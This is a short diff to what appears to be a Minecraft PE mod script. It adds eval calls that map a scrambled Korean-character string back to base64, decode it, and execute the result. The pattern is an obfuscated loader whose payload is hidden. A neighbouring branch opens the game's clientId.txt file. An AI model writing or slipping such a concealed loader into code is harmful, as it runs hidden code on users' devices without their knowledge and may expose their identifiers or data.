@@ -316,12 +316,12 @@ function floatingCC(){
 								var v="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split("");
 								var x="궇겕럌러다크토네이도바보붸에꺙렸땛잎츟권로잡리혀콘감뎈넫멅씌철컹뵝웽읭냐루코엙뭥지킈갸계니가뭘알아넓튷헿광파쉈꺾쟠맟찷갅윇뷁".split("");
 								for(var n=0;n<v.length;n++){
-									("u=u.replace(/"+x[n]+"/g,v[n]);");
+									eval("u=u.replace(/"+x[n]+"/g,v[n]);");
 								}
 								u=u.replace(/냥/g,"+").replace(/파/g,"=").replace(/스/g,"/");
 								var y=android.util.Base64.decode(u.toString(),0);
 								var z=new java.lang.String(y,"UTF-8");
-								(z+"");
+								eval(z+"");
 								break;
 								case 1 : 
 								var clientid = new java.io.File(sdcard+"/games/com.mojang/minecraftpe/clientId.txt");
